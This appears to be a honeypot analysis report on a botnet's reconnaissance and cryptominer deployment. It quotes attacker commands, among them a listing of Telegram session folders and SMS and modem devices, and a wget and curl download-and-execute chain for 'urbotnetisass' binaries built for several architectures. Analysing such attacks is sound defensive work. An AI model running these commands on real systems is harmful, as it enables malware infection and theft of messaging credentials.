# Attacker Behavior Analysis

This section analyses the attacker's behavior, focusing on reconnaissance activities targeting the system as well as the downloading and execution of malicious files. The analysis demonstrates how the attacker first mapped the target environment, removed competing cryptominers and prepared the system for deploying their own malicious mining operations.


# Reconnaissance Activity

#### Top 10 Most Used Commands 

| Command Line Input | Count |
| --- | --- | 
| `/ip cloud print` | 4 |
| cat /proc/uptime 2 > /dev/null &#124; cut -d. -f1 | 4 |
| `uname -a` | 3 |
| `Accept-Encoding: gzip` | 2 |
| `cat /proc/cpuinfo` | 2 | 
| echo Hi &#124; cat -n | 2 |
| `ifconfig` | 2 | 
| `locate D877F783D5D3EF8Cs` | 2 |
| `ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*` | 2 |
| ps -ef &#124; grep '[Mm]iner' | 2 |

Based on the observed commands the attacker was conducting reconnaissance with the goal of gathering as much information as possible about the target system. They collected details about the operating system, hardware and network configuration using commands such as uname -a, cat /proc/cpuinfo, ifconfig and cat /proc/uptime. This information was likely used to assess the system's performance capabilities and determine whether it could be used for cryptomining as well as to check whether any mining software was already running on the machine.


# Breaking Down a Malicious Command

One of these commands was specifically used to download and execute a malicious file which I will now examine as an example. Analysis of this command reveals the attacker's sequence of actions as follows:

The attacker began by changing the directory to /data/local/tmp/ which is typically used for storing temporary files. After that they cleared the directory by removing all of its contents.
```Plaintext
cd /data/local/tmp/; rm*
```
Next the attacker used the wget command to download a malicious file and relied on the curl command as a backup in case wget was not installed.

```Plaintext
busybox wget http://<IP-ADDRESS>/arm7.urbotnetisass
curl http://<IP-ADDRESS>/arm7.urbotnetisass -O
```
Finally the attacker granted execution permissions to the downloaded file and executed it.

```Plaintext

chmod +x arm7.urbotnetisass
./arm7.urbotnetisass android
```

The same actions were also performed on all of the following files:

| Malicious Files |
| --- |
| arm.urbotnetisass |
| arm5.urbotnetisass |
| arm6.urbotnetisass |
| arm7.urbotnetisass |
| x86_32.urbotnetisass |
| mips.urbotnetisass |
| mipsel.urbotnetisass |

Based on the previously observed commands it can be concluded that the attacks related to downloading and installing the cryptominer were fully automated. The files are downloaded using the wget command and if wget is not available curl is used as fallback. In addition the attacker downloads several different files at once, all of which are subjected to the same previously identified commands in the hope that at least one of the malicious files will be executed.

# Conclusion

It appears that the attacker likely leveraged a botnet to carry out multiple attacks. The attack chain started with reconnaissance to map the target system's hardware, operating system and network configuration as well as to identify any competing mining software. This was followed by an automated process to download and execute multiple malicious binaries for different architectures ensuring that at least one mining program would execute.

The same attacker seems to have conducted both the reconnaissance and the subsequent file deployment though reconnaissance commands were observed far more frequently than actual malicious file downloads. This suggests that the honeypot may have been probed by multiple attackers.

The attacker's behavior demonstrates a clear intent to remove competing miners and maximize the effectiveness of their own cryptomining malware. The extensive automation, use of fallback download methods and deployment of multiple binaries indicate an automated approach designed to ensure successful execution on as many systems as possible.
